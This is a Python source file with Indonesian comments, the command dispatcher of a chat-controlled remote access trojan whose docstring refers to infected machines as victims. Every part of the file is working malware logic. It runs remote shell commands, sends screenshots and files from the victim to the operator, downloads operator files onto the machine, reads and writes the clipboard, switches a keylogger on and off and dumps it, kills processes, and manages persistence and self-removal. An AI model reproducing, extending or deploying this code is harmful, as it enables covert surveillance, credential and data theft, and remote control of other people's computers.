"""core/cmd.py — router perintah.

Format perintah di channel:
    !a <verb> [args]           hanya mesin dengan alias a
    !<uuid> <verb> [args]      bentuk panjang, sama-sama jalan
    !* <verb> [args]           semua instance

Output selalu diprefix [alias] supaya lu bisa bedain korban.
"""

import os
import tempfile
import threading
import time

from . import caps, persist

HELP = """verb yang ada:
info                 ringkasan mesin
sh <cmd>             jalankan shell, cwd persist
cd <path>            pindah cwd
ls [path]            daftar direktori
shot                 screenshot -> attachment
dl <path>            tarik file dari korban
up <path>            lampirkan file + perintah ini, simpan ke <path>
clip                 baca clipboard
clip <text>          tulis clipboard
keys on|off|dump     keylogger
ps                   daftar proses
kill <pid>
msg <text>           messagebox
persist              pasang ulang autostart
unpersist            cabut autostart
sleep <detik>        jeda polling
exit                 mati (autostart tetap)
purge                hapus diri total"""


class Dispatcher:
    def __init__(self, bot, shell, keylogger, name, state):
        self.bot = bot
        self.shell = shell
        self.kl = keylogger
        self.name = name
        self.state = state

    def handle(self, msg):
        content = (msg.get("content") or "").strip()
        attachments = msg.get("attachments") or []

        if content.startswith("!"):
            head, _, body = content[1:].partition(" ")
            head = head.strip().lower()
            # Tiga bentuk: !a (alias), !<uuid penuh>, !* (semua).
            if head in ("*", "all", self.bot.uuid.lower(), self.bot.alias.lower()):
                self._dispatch(body.strip(), attachments)
            return

        # Attachment tanpa perintah = file yang nyangkut, abaikan.
        if attachments:
            self.bot.send("lampiran tanpa perintah, pakai: !%s up <path>" % self.bot.alias)

    def _dispatch(self, body, attachments):
        verb, _, arg = body.partition(" ")
        verb = verb.lower().strip()
        arg = arg.strip()

        if verb in ("help", "?"):
            return self.bot.send("alias mesin ini: !%s   (!* = semua mesin)\n%s"
                                 % (self.bot.alias, HELP))
        if verb == "info":
            return self.bot.send(caps.sysinfo())
        if verb == "sh":
            return self.bot.send(self.shell.run(arg) if arg else "[err] kosong")
        if verb == "cd":
            return self.bot.send(self.shell.cd(arg))
        if verb == "ls":
            return self.bot.send(caps.listdir(arg or self.shell.cwd))
        if verb == "shot":
            return self._shot()
        if verb == "dl":
            return self._download(arg)
        if verb == "up":
            return self._upload(arg, attachments)
        if verb == "clip":
            return self.bot.send(caps.clipboard_set(arg) if arg else caps.clipboard_get())
        if verb == "keys":
            return self._keys(arg)
        if verb == "ps":
            return self.bot.send(caps.processes())
        if verb == "kill":
            return self.bot.send(caps.kill(arg))
        if verb == "msg":
            threading.Thread(target=caps.messagebox, args=(arg or " ",), daemon=True).start()
            return self.bot.send("ditampilkan")
        if verb == "persist":
            return self.bot.send(persist.install(self.name) or "[skip]")
        if verb == "unpersist":
            return self.bot.send(persist.remove(self.name))
        if verb == "sleep":
            try:
                self.state["sleep"] = max(1.0, min(float(arg), 3600.0))
            except ValueError:
                return self.bot.send("[err] angka")
            return self.bot.send("polling %ss" % self.state["sleep"])
        if verb == "purge":
            self.bot.send(persist.purge(self.name))
            time.sleep(1)
            os._exit(0)
        if verb == "exit":
            self.bot.send("mati")
            time.sleep(1)
            os._exit(0)
        return self.bot.send("[err] verb tidak dikenal: %s" % (verb or "?"))

    def _shot(self):
        dest = os.path.join(tempfile.gettempdir(), "s_%d.png" % int(time.time()))
        try:
            caps.screenshot(dest)
            self.bot.send_file(dest, "screenshot")
        except Exception as exc:
            self.bot.send("[err] %s" % exc)
        finally:
            try:
                os.remove(dest)
            except OSError:
                pass

    def _download(self, path):
        if not path:
            return self.bot.send("[err] butuh path")
        full = os.path.abspath(os.path.join(self.shell.cwd, os.path.expanduser(path)))
        if not os.path.isfile(full):
            return self.bot.send("[err] tidak ada: %s" % full)
        size = os.path.getsize(full)
        if size > 24 * 1024 * 1024:
            return self.bot.send("[err] %d MB, di atas limit upload" % (size / 2 ** 20))
        try:
            self.bot.send_file(full, "%s (%d B)" % (os.path.basename(full), size))
        except Exception as exc:
            self.bot.send("[err] %s" % exc)

    def _upload(self, path, attachments):
        if not attachments:
            return self.bot.send("[err] lampirkan file ke pesan ini")
        if not path:
            return self.bot.send("[err] butuh path tujuan")
        dest = os.path.abspath(os.path.join(self.shell.cwd, os.path.expanduser(path)))
        os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
        try:
            self.bot.fetch(attachments[0]["url"], dest)
            self.bot.send("tersimpan: %s (%d B)" % (dest, os.path.getsize(dest)))
        except Exception as exc:
            self.bot.send("[err] %s" % exc)

    def _keys(self, arg):
        arg = arg.strip().lower()
        if arg == "on":
            return self.bot.send(self.kl.start())
        if arg == "off":
            return self.bot.send(self.kl.stop())
        if arg == "dump" or not arg:
            return self.bot.send(self.kl.dump())
        return self.bot.send(HELP)
